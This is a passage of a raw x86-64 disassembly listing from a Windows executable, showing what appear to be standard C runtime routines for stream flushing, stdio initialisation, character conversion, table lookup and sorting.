   140008e6a:	e8 b9 d1 ff ff       	call   0x140006028
   140008e6f:	90                   	nop
   140008e70:	48 8b 1d 99 fd 00 00 	mov    0xfd99(%rip),%rbx        # 0x140018c10
   140008e77:	48 63 05 8a fd 00 00 	movslq 0xfd8a(%rip),%rax        # 0x140018c08
   140008e7e:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   140008e82:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140008e87:	49 3b de             	cmp    %r14,%rbx
   140008e8a:	0f 84 88 00 00 00    	je     0x140008f18
   140008e90:	48 8b 03             	mov    (%rbx),%rax
   140008e93:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008e98:	48 8b 17             	mov    (%rdi),%rdx
   140008e9b:	48 85 c0             	test   %rax,%rax
   140008e9e:	74 21                	je     0x140008ec1
   140008ea0:	8b 48 14             	mov    0x14(%rax),%ecx
   140008ea3:	8b c1                	mov    %ecx,%eax
   140008ea5:	c1 e8 0d             	shr    $0xd,%eax
   140008ea8:	a8 01                	test   $0x1,%al
   140008eaa:	74 15                	je     0x140008ec1
   140008eac:	8b c1                	mov    %ecx,%eax
   140008eae:	24 03                	and    $0x3,%al
   140008eb0:	3c 02                	cmp    $0x2,%al
   140008eb2:	75 05                	jne    0x140008eb9
   140008eb4:	f6 c1 c0             	test   $0xc0,%cl
   140008eb7:	75 0e                	jne    0x140008ec7
   140008eb9:	0f ba e1 0b          	bt     $0xb,%ecx
   140008ebd:	72 08                	jb     0x140008ec7
   140008ebf:	ff 02                	incl   (%rdx)
   140008ec1:	48 83 c3 08          	add    $0x8,%rbx
   140008ec5:	eb bb                	jmp    0x140008e82
   140008ec7:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   140008ecb:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140008ecf:	48 8b 07             	mov    (%rdi),%rax
   140008ed2:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140008ed7:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140008edc:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140008ee1:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140008ee6:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140008eeb:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008ef0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008ef5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008efa:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   140008eff:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140008f04:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140008f09:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140008f10:	00 
   140008f11:	e8 9e fe ff ff       	call   0x140008db4
   140008f16:	eb a9                	jmp    0x140008ec1
   140008f18:	8b 0e                	mov    (%rsi),%ecx
   140008f1a:	e8 5d d1 ff ff       	call   0x14000607c
   140008f1f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140008f26:	00 
   140008f27:	48 83 c4 60          	add    $0x60,%rsp
   140008f2b:	41 5e                	pop    %r14
   140008f2d:	5f                   	pop    %rdi
   140008f2e:	5e                   	pop    %rsi
   140008f2f:	c3                   	ret
   140008f30:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   140008f34:	55                   	push   %rbp
   140008f35:	48 8b ec             	mov    %rsp,%rbp
   140008f38:	48 83 ec 40          	sub    $0x40,%rsp
   140008f3c:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   140008f40:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140008f44:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   140008f48:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140008f4c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140008f50:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140008f54:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140008f58:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008f5c:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140008f60:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140008f64:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008f68:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140008f6c:	b8 08 00 00 00       	mov    $0x8,%eax
   140008f71:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140008f74:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140008f77:	e8 d4 fe ff ff       	call   0x140008e50
   140008f7c:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   140008f80:	8b 45 20             	mov    0x20(%rbp),%eax
   140008f83:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   140008f87:	48 83 c4 40          	add    $0x40,%rsp
   140008f8b:	5d                   	pop    %rbp
   140008f8c:	c3                   	ret
   140008f8d:	cc                   	int3
   140008f8e:	cc                   	int3
   140008f8f:	cc                   	int3
   140008f90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008f95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008f9a:	57                   	push   %rdi
   140008f9b:	48 83 ec 20          	sub    $0x20,%rsp
   140008f9f:	48 8b d9             	mov    %rcx,%rbx
   140008fa2:	8b 49 14             	mov    0x14(%rcx),%ecx
   140008fa5:	8b c1                	mov    %ecx,%eax
   140008fa7:	24 03                	and    $0x3,%al
   140008fa9:	3c 02                	cmp    $0x2,%al
   140008fab:	75 4b                	jne    0x140008ff8
   140008fad:	f6 c1 c0             	test   $0xc0,%cl
   140008fb0:	74 46                	je     0x140008ff8
   140008fb2:	8b 3b                	mov    (%rbx),%edi
   140008fb4:	2b 7b 08             	sub    0x8(%rbx),%edi
   140008fb7:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   140008fbb:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   140008fbf:	48 89 33             	mov    %rsi,(%rbx)
   140008fc2:	85 ff                	test   %edi,%edi
   140008fc4:	7e 32                	jle    0x140008ff8
   140008fc6:	48 8b cb             	mov    %rbx,%rcx
   140008fc9:	e8 ae 03 00 00       	call   0x14000937c
   140008fce:	8b c8                	mov    %eax,%ecx
   140008fd0:	44 8b c7             	mov    %edi,%r8d
   140008fd3:	48 8b d6             	mov    %rsi,%rdx
   140008fd6:	e8 25 1c 00 00       	call   0x14000ac00
   140008fdb:	3b f8                	cmp    %eax,%edi
   140008fdd:	74 0a                	je     0x140008fe9
   140008fdf:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   140008fe4:	83 c8 ff             	or     $0xffffffff,%eax
   140008fe7:	eb 11                	jmp    0x140008ffa
   140008fe9:	8b 43 14             	mov    0x14(%rbx),%eax
   140008fec:	c1 e8 02             	shr    $0x2,%eax
   140008fef:	a8 01                	test   $0x1,%al
   140008ff1:	74 05                	je     0x140008ff8
   140008ff3:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   140008ff8:	33 c0                	xor    %eax,%eax
   140008ffa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008fff:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009004:	48 83 c4 20          	add    $0x20,%rsp
   140009008:	5f                   	pop    %rdi
   140009009:	c3                   	ret
   14000900a:	cc                   	int3
   14000900b:	cc                   	int3
   14000900c:	40 53                	rex push %rbx
   14000900e:	48 83 ec 20          	sub    $0x20,%rsp
   140009012:	48 8b d9             	mov    %rcx,%rbx
   140009015:	48 85 c9             	test   %rcx,%rcx
   140009018:	75 0a                	jne    0x140009024
   14000901a:	48 83 c4 20          	add    $0x20,%rsp
   14000901e:	5b                   	pop    %rbx
   14000901f:	e9 0c ff ff ff       	jmp    0x140008f30
   140009024:	e8 67 ff ff ff       	call   0x140008f90
   140009029:	85 c0                	test   %eax,%eax
   14000902b:	75 21                	jne    0x14000904e
   14000902d:	8b 43 14             	mov    0x14(%rbx),%eax
   140009030:	c1 e8 0b             	shr    $0xb,%eax
   140009033:	a8 01                	test   $0x1,%al
   140009035:	74 13                	je     0x14000904a
   140009037:	48 8b cb             	mov    %rbx,%rcx
   14000903a:	e8 3d 03 00 00       	call   0x14000937c
   14000903f:	8b c8                	mov    %eax,%ecx
   140009041:	e8 aa 12 00 00       	call   0x14000a2f0
   140009046:	85 c0                	test   %eax,%eax
   140009048:	75 04                	jne    0x14000904e
   14000904a:	33 c0                	xor    %eax,%eax
   14000904c:	eb 03                	jmp    0x140009051
   14000904e:	83 c8 ff             	or     $0xffffffff,%eax
   140009051:	48 83 c4 20          	add    $0x20,%rsp
   140009055:	5b                   	pop    %rbx
   140009056:	c3                   	ret
   140009057:	cc                   	int3
   140009058:	b1 01                	mov    $0x1,%cl
   14000905a:	e9 d1 fe ff ff       	jmp    0x140008f30
   14000905f:	cc                   	int3
   140009060:	48 8b c4             	mov    %rsp,%rax
   140009063:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009067:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000906b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000906f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009073:	41 56                	push   %r14
   140009075:	48 83 ec 20          	sub    $0x20,%rsp
   140009079:	8b 05 89 fb 00 00    	mov    0xfb89(%rip),%eax        # 0x140018c08
   14000907f:	33 db                	xor    %ebx,%ebx
   140009081:	bf 03 00 00 00       	mov    $0x3,%edi
   140009086:	85 c0                	test   %eax,%eax
   140009088:	75 07                	jne    0x140009091
   14000908a:	b8 00 02 00 00       	mov    $0x200,%eax
   14000908f:	eb 05                	jmp    0x140009096
   140009091:	3b c7                	cmp    %edi,%eax
   140009093:	0f 4c c7             	cmovl  %edi,%eax
   140009096:	48 63 c8             	movslq %eax,%rcx
   140009099:	ba 08 00 00 00       	mov    $0x8,%edx
   14000909e:	89 05 64 fb 00 00    	mov    %eax,0xfb64(%rip)        # 0x140018c08
   1400090a4:	e8 4f d0 ff ff       	call   0x1400060f8
   1400090a9:	33 c9                	xor    %ecx,%ecx
   1400090ab:	48 89 05 5e fb 00 00 	mov    %rax,0xfb5e(%rip)        # 0x140018c10
   1400090b2:	e8 b9 d0 ff ff       	call   0x140006170
   1400090b7:	48 39 1d 52 fb 00 00 	cmp    %rbx,0xfb52(%rip)        # 0x140018c10
   1400090be:	75 2f                	jne    0x1400090ef
   1400090c0:	ba 08 00 00 00       	mov    $0x8,%edx
   1400090c5:	89 3d 3d fb 00 00    	mov    %edi,0xfb3d(%rip)        # 0x140018c08
   1400090cb:	48 8b cf             	mov    %rdi,%rcx
   1400090ce:	e8 25 d0 ff ff       	call   0x1400060f8
   1400090d3:	33 c9                	xor    %ecx,%ecx
   1400090d5:	48 89 05 34 fb 00 00 	mov    %rax,0xfb34(%rip)        # 0x140018c10
   1400090dc:	e8 8f d0 ff ff       	call   0x140006170
   1400090e1:	48 39 1d 28 fb 00 00 	cmp    %rbx,0xfb28(%rip)        # 0x140018c10
   1400090e8:	75 05                	jne    0x1400090ef
   1400090ea:	83 c8 ff             	or     $0xffffffff,%eax
   1400090ed:	eb 75                	jmp    0x140009164
   1400090ef:	48 8b eb             	mov    %rbx,%rbp
   1400090f2:	48 8d 35 df e6 00 00 	lea    0xe6df(%rip),%rsi        # 0x1400177d8
   1400090f9:	4c 8d 35 c0 e6 00 00 	lea    0xe6c0(%rip),%r14        # 0x1400177c0
   140009100:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   140009104:	45 33 c0             	xor    %r8d,%r8d
   140009107:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000910c:	e8 2f cc ff ff       	call   0x140005d40
   140009111:	48 8b 05 f8 fa 00 00 	mov    0xfaf8(%rip),%rax        # 0x140018c10
   140009118:	4c 8d 05 b1 f6 00 00 	lea    0xf6b1(%rip),%r8        # 0x1400187d0
   14000911f:	48 8b d5             	mov    %rbp,%rdx
   140009122:	48 c1 fa 06          	sar    $0x6,%rdx
   140009126:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000912a:	48 8b c5             	mov    %rbp,%rax
   14000912d:	83 e0 3f             	and    $0x3f,%eax
   140009130:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   140009134:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   140009138:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000913d:	48 83 c1 02          	add    $0x2,%rcx
   140009141:	48 83 f9 02          	cmp    $0x2,%rcx
   140009145:	77 06                	ja     0x14000914d
   140009147:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000914d:	48 ff c5             	inc    %rbp
   140009150:	49 83 c6 58          	add    $0x58,%r14
   140009154:	48 83 c3 08          	add    $0x8,%rbx
   140009158:	48 83 c6 58          	add    $0x58,%rsi
   14000915c:	48 83 ef 01          	sub    $0x1,%rdi
   140009160:	75 9e                	jne    0x140009100
   140009162:	33 c0                	xor    %eax,%eax
   140009164:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009169:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000916e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009173:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009178:	48 83 c4 20          	add    $0x20,%rsp
   14000917c:	41 5e                	pop    %r14
   14000917e:	c3                   	ret
   14000917f:	cc                   	int3
   140009180:	40 53                	rex push %rbx
   140009182:	48 83 ec 20          	sub    $0x20,%rsp
   140009186:	e8 cd fe ff ff       	call   0x140009058
   14000918b:	e8 40 1e 00 00       	call   0x14000afd0
   140009190:	33 db                	xor    %ebx,%ebx
   140009192:	48 8b 0d 77 fa 00 00 	mov    0xfa77(%rip),%rcx        # 0x140018c10
   140009199:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   14000919d:	e8 e2 1e 00 00       	call   0x14000b084
   1400091a2:	48 8b 05 67 fa 00 00 	mov    0xfa67(%rip),%rax        # 0x140018c10
   1400091a9:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   1400091ad:	48 83 c1 30          	add    $0x30,%rcx
   1400091b1:	ff 15 a9 3f 00 00    	call   *0x3fa9(%rip)        # 0x14000d160
   1400091b7:	48 83 c3 08          	add    $0x8,%rbx
   1400091bb:	48 83 fb 18          	cmp    $0x18,%rbx
   1400091bf:	75 d1                	jne    0x140009192
   1400091c1:	48 8b 0d 48 fa 00 00 	mov    0xfa48(%rip),%rcx        # 0x140018c10
   1400091c8:	e8 a3 cf ff ff       	call   0x140006170
   1400091cd:	48 83 25 3b fa 00 00 	andq   $0x0,0xfa3b(%rip)        # 0x140018c10
   1400091d4:	00 
   1400091d5:	48 83 c4 20          	add    $0x20,%rsp
   1400091d9:	5b                   	pop    %rbx
   1400091da:	c3                   	ret
   1400091db:	cc                   	int3
   1400091dc:	48 83 c1 30          	add    $0x30,%rcx
   1400091e0:	48 ff 25 69 3f 00 00 	rex.W jmp *0x3f69(%rip)        # 0x14000d150
   1400091e7:	cc                   	int3
   1400091e8:	48 83 c1 30          	add    $0x30,%rcx
   1400091ec:	48 ff 25 65 3f 00 00 	rex.W jmp *0x3f65(%rip)        # 0x14000d158
   1400091f3:	cc                   	int3
   1400091f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400091f9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400091fe:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009203:	57                   	push   %rdi
   140009204:	48 83 ec 50          	sub    $0x50,%rsp
   140009208:	33 ed                	xor    %ebp,%ebp
   14000920a:	49 8b f0             	mov    %r8,%rsi
   14000920d:	48 8b fa             	mov    %rdx,%rdi
   140009210:	48 8b d9             	mov    %rcx,%rbx
   140009213:	48 85 d2             	test   %rdx,%rdx
   140009216:	0f 84 38 01 00 00    	je     0x140009354
   14000921c:	4d 85 c0             	test   %r8,%r8
   14000921f:	0f 84 2f 01 00 00    	je     0x140009354
   140009225:	40 38 2a             	cmp    %bpl,(%rdx)
   140009228:	75 11                	jne    0x14000923b
   14000922a:	48 85 c9             	test   %rcx,%rcx
   14000922d:	0f 84 28 01 00 00    	je     0x14000935b
   140009233:	66 89 29             	mov    %bp,(%rcx)
   140009236:	e9 20 01 00 00       	jmp    0x14000935b
   14000923b:	49 8b d1             	mov    %r9,%rdx
   14000923e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140009243:	e8 f8 a7 ff ff       	call   0x140003a40
   140009248:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000924d:	81 78 0c e9 fd 00 00 	cmpl   $0xfde9,0xc(%rax)
   140009254:	75 22                	jne    0x140009278
   140009256:	4c 8d 0d cb f9 00 00 	lea    0xf9cb(%rip),%r9        # 0x140018c28
   14000925d:	4c 8b c6             	mov    %rsi,%r8
   140009260:	48 8b d7             	mov    %rdi,%rdx
   140009263:	48 8b cb             	mov    %rbx,%rcx
   140009266:	e8 05 1f 00 00       	call   0x14000b170
   14000926b:	48 8b c8             	mov    %rax,%rcx
   14000926e:	83 c8 ff             	or     $0xffffffff,%eax
   140009271:	85 c9                	test   %ecx,%ecx
   140009273:	0f 48 c8             	cmovs  %eax,%ecx
   140009276:	eb 19                	jmp    0x140009291
   140009278:	48 39 a8 38 01 00 00 	cmp    %rbp,0x138(%rax)
   14000927f:	75 2a                	jne    0x1400092ab
   140009281:	48 85 db             	test   %rbx,%rbx
   140009284:	74 06                	je     0x14000928c
   140009286:	0f b6 07             	movzbl (%rdi),%eax
   140009289:	66 89 03             	mov    %ax,(%rbx)
   14000928c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009291:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   140009296:	74 0c                	je     0x1400092a4
   140009298:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000929d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400092a4:	8b c1                	mov    %ecx,%eax
   1400092a6:	e9 b2 00 00 00       	jmp    0x14000935d
   1400092ab:	0f b6 0f             	movzbl (%rdi),%ecx
   1400092ae:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400092b3:	e8 6c 1e 00 00       	call   0x14000b124
   1400092b8:	85 c0                	test   %eax,%eax
   1400092ba:	74 52                	je     0x14000930e
   1400092bc:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400092c1:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   1400092c5:	41 83 f9 01          	cmp    $0x1,%r9d
   1400092c9:	7e 2f                	jle    0x1400092fa
   1400092cb:	41 3b f1             	cmp    %r9d,%esi
   1400092ce:	7c 2a                	jl     0x1400092fa
   1400092d0:	8b 49 0c             	mov    0xc(%rcx),%ecx
   1400092d3:	8b c5                	mov    %ebp,%eax
   1400092d5:	48 85 db             	test   %rbx,%rbx
   1400092d8:	4c 8b c7             	mov    %rdi,%r8
   1400092db:	ba 09 00 00 00       	mov    $0x9,%edx
   1400092e0:	0f 95 c0             	setne  %al
   1400092e3:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400092e7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400092ec:	e8 cb e5 ff ff       	call   0x1400078bc
   1400092f1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400092f6:	85 c0                	test   %eax,%eax
   1400092f8:	75 0f                	jne    0x140009309
   1400092fa:	48 63 41 08          	movslq 0x8(%rcx),%rax
   1400092fe:	48 3b f0             	cmp    %rax,%rsi
   140009301:	72 3e                	jb     0x140009341
   140009303:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   140009307:	74 38                	je     0x140009341
   140009309:	8b 49 08             	mov    0x8(%rcx),%ecx
   14000930c:	eb 83                	jmp    0x140009291
   14000930e:	8b c5                	mov    %ebp,%eax
   140009310:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009316:	48 85 db             	test   %rbx,%rbx
   140009319:	4c 8b c7             	mov    %rdi,%r8
   14000931c:	0f 95 c0             	setne  %al
   14000931f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009323:	41 8d 51 08          	lea    0x8(%r9),%edx
   140009327:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000932c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009331:	8b 48 0c             	mov    0xc(%rax),%ecx
   140009334:	e8 83 e5 ff ff       	call   0x1400078bc
   140009339:	85 c0                	test   %eax,%eax
   14000933b:	0f 85 4b ff ff ff    	jne    0x14000928c
   140009341:	e8 4a c6 ff ff       	call   0x140005990
   140009346:	83 c9 ff             	or     $0xffffffff,%ecx
   140009349:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000934f:	e9 3d ff ff ff       	jmp    0x140009291
   140009354:	48 89 2d cd f8 00 00 	mov    %rbp,0xf8cd(%rip)        # 0x140018c28
   14000935b:	33 c0                	xor    %eax,%eax
   14000935d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140009362:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140009367:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000936c:	48 83 c4 50          	add    $0x50,%rsp
   140009370:	5f                   	pop    %rdi
   140009371:	c3                   	ret
   140009372:	cc                   	int3
   140009373:	cc                   	int3
   140009374:	45 33 c9             	xor    %r9d,%r9d
   140009377:	e9 78 fe ff ff       	jmp    0x1400091f4
   14000937c:	48 83 ec 28          	sub    $0x28,%rsp
   140009380:	48 85 c9             	test   %rcx,%rcx
   140009383:	75 15                	jne    0x14000939a
   140009385:	e8 06 c6 ff ff       	call   0x140005990
   14000938a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009390:	e8 db c4 ff ff       	call   0x140005870
   140009395:	83 c8 ff             	or     $0xffffffff,%eax
   140009398:	eb 03                	jmp    0x14000939d
   14000939a:	8b 41 18             	mov    0x18(%rcx),%eax
   14000939d:	48 83 c4 28          	add    $0x28,%rsp
   1400093a1:	c3                   	ret
   1400093a2:	cc                   	int3
   1400093a3:	cc                   	int3
   1400093a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400093a9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400093ae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400093b3:	57                   	push   %rdi
   1400093b4:	41 56                	push   %r14
   1400093b6:	41 57                	push   %r15
   1400093b8:	48 83 ec 20          	sub    $0x20,%rsp
   1400093bc:	4c 8b f1             	mov    %rcx,%r14
   1400093bf:	48 85 c9             	test   %rcx,%rcx
   1400093c2:	74 74                	je     0x140009438
   1400093c4:	33 db                	xor    %ebx,%ebx
   1400093c6:	4c 8d 3d 33 6c ff ff 	lea    -0x93cd(%rip),%r15        # 0x140000000
   1400093cd:	bf e3 00 00 00       	mov    $0xe3,%edi
   1400093d2:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   1400093d5:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   1400093db:	99                   	cltd
   1400093dc:	49 8b ce             	mov    %r14,%rcx
   1400093df:	2b c2                	sub    %edx,%eax
   1400093e1:	d1 f8                	sar    $1,%eax
   1400093e3:	48 63 e8             	movslq %eax,%rbp
   1400093e6:	48 8b d5             	mov    %rbp,%rdx
   1400093e9:	48 8b f5             	mov    %rbp,%rsi
   1400093ec:	48 03 d2             	add    %rdx,%rdx
   1400093ef:	49 8b 94 d7 a0 13 01 	mov    0x113a0(%r15,%rdx,8),%rdx
   1400093f6:	00 
   1400093f7:	e8 e0 a6 ff ff       	call   0x140003adc
   1400093fc:	85 c0                	test   %eax,%eax
   1400093fe:	74 13                	je     0x140009413
   140009400:	79 05                	jns    0x140009407
   140009402:	8d 7d ff             	lea    -0x1(%rbp),%edi
   140009405:	eb 03                	jmp    0x14000940a
   140009407:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000940a:	3b df                	cmp    %edi,%ebx
   14000940c:	7e c4                	jle    0x1400093d2
   14000940e:	83 c8 ff             	or     $0xffffffff,%eax
   140009411:	eb 0b                	jmp    0x14000941e
   140009413:	48 03 f6             	add    %rsi,%rsi
   140009416:	41 8b 84 f7 a8 13 01 	mov    0x113a8(%r15,%rsi,8),%eax
   14000941d:	00 
   14000941e:	85 c0                	test   %eax,%eax
   140009420:	78 16                	js     0x140009438
   140009422:	3d e4 00 00 00       	cmp    $0xe4,%eax
   140009427:	73 0f                	jae    0x140009438
   140009429:	48 98                	cltq
   14000942b:	48 03 c0             	add    %rax,%rax
   14000942e:	41 8b 84 c7 50 f9 00 	mov    0xf950(%r15,%rax,8),%eax
   140009435:	00 
   140009436:	eb 02                	jmp    0x14000943a
   140009438:	33 c0                	xor    %eax,%eax
   14000943a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000943f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140009444:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140009449:	48 83 c4 20          	add    $0x20,%rsp
   14000944d:	41 5f                	pop    %r15
   14000944f:	41 5e                	pop    %r14
   140009451:	5f                   	pop    %rdi
   140009452:	c3                   	ret
   140009453:	cc                   	int3
   140009454:	cc                   	int3
   140009455:	cc                   	int3
   140009456:	cc                   	int3
   140009457:	cc                   	int3
   140009458:	cc                   	int3
   140009459:	cc                   	int3
   14000945a:	cc                   	int3
   14000945b:	cc                   	int3
   14000945c:	cc                   	int3
   14000945d:	cc                   	int3
   14000945e:	cc                   	int3
   14000945f:	cc                   	int3
   140009460:	41 54                	push   %r12
   140009462:	41 55                	push   %r13
   140009464:	41 56                	push   %r14
   140009466:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000946d:	48 8b 05 8c db 00 00 	mov    0xdb8c(%rip),%rax        # 0x140017000
   140009474:	48 33 c4             	xor    %rsp,%rax
   140009477:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000947e:	00 
   14000947f:	4d 8b e1             	mov    %r9,%r12
   140009482:	4d 8b f0             	mov    %r8,%r14
   140009485:	4c 8b e9             	mov    %rcx,%r13
   140009488:	48 85 c9             	test   %rcx,%rcx
   14000948b:	75 1a                	jne    0x1400094a7
   14000948d:	48 85 d2             	test   %rdx,%rdx
   140009490:	74 15                	je     0x1400094a7
   140009492:	e8 f9 c4 ff ff       	call   0x140005990
   140009497:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000949d:	e8 ce c3 ff ff       	call   0x140005870
   1400094a2:	e9 38 03 00 00       	jmp    0x1400097df
   1400094a7:	4d 85 f6             	test   %r14,%r14
   1400094aa:	74 e6                	je     0x140009492
   1400094ac:	4d 85 e4             	test   %r12,%r12
   1400094af:	74 e1                	je     0x140009492
   1400094b1:	48 83 fa 02          	cmp    $0x2,%rdx
   1400094b5:	0f 82 24 03 00 00    	jb     0x1400097df
   1400094bb:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   1400094c2:	00 
   1400094c3:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   1400094ca:	00 
   1400094cb:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   1400094d2:	00 
   1400094d3:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   1400094da:	00 
   1400094db:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   1400094e2:	00 
   1400094e3:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   1400094e7:	4d 0f af fe          	imul   %r14,%r15
   1400094eb:	4c 03 f9             	add    %rcx,%r15
   1400094ee:	33 c9                	xor    %ecx,%ecx
   1400094f0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400094f5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400094fc:	00 00 00 00 
   140009500:	33 d2                	xor    %edx,%edx
   140009502:	49 8b c7             	mov    %r15,%rax
   140009505:	49 2b c5             	sub    %r13,%rax
   140009508:	49 f7 f6             	div    %r14
   14000950b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000950f:	48 83 fb 08          	cmp    $0x8,%rbx
   140009513:	0f 87 8b 00 00 00    	ja     0x1400095a4
   140009519:	4d 3b fd             	cmp    %r13,%r15
   14000951c:	76 65                	jbe    0x140009583
   14000951e:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   140009522:	49 8b dd             	mov    %r13,%rbx
   140009525:	48 8b fe             	mov    %rsi,%rdi
   140009528:	49 3b f7             	cmp    %r15,%rsi
   14000952b:	77 20                	ja     0x14000954d
   14000952d:	0f 1f 00             	nopl   (%rax)
   140009530:	48 8b d3             	mov    %rbx,%rdx
   140009533:	48 8b cf             	mov    %rdi,%rcx
   140009536:	49 8b c4             	mov    %r12,%rax
   140009539:	ff 15 49 3d 00 00    	call   *0x3d49(%rip)        # 0x14000d288
   14000953f:	85 c0                	test   %eax,%eax
   140009541:	48 0f 4f df          	cmovg  %rdi,%rbx
   140009545:	49 03 fe             	add    %r14,%rdi
   140009548:	49 3b ff             	cmp    %r15,%rdi
   14000954b:	76 e3                	jbe    0x140009530
   14000954d:	4d 8b c6             	mov    %r14,%r8
   140009550:	49 8b d7             	mov    %r15,%rdx
   140009553:	49 3b df             	cmp    %r15,%rbx
   140009556:	74 1e                	je     0x140009576
   140009558:	49 2b df             	sub    %r15,%rbx
   14000955b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009560:	0f b6 02             	movzbl (%rdx),%eax
   140009563:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
